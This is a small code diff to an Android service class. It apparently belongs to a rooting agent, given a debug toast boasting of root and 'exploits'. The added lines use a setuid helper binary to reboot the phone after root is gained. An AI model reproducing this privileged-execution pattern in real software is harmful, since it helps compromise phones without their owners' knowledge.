@@ -162,6 +162,9 @@ public class ServiceCore extends Service {
 							"WE ARE ROOOOOOOT, I LOVE QUEZ MADE EXPLOITS!!!",
 							Toast.LENGTH_LONG).show();
 				}
+				
+				// Riavviamo il telefono
+				Runtime.getRuntime().exec(path + "/" + suidext + " reb");
 			} else {
 				if (Cfg.DEBUG) {
 					Log.d("QZ",
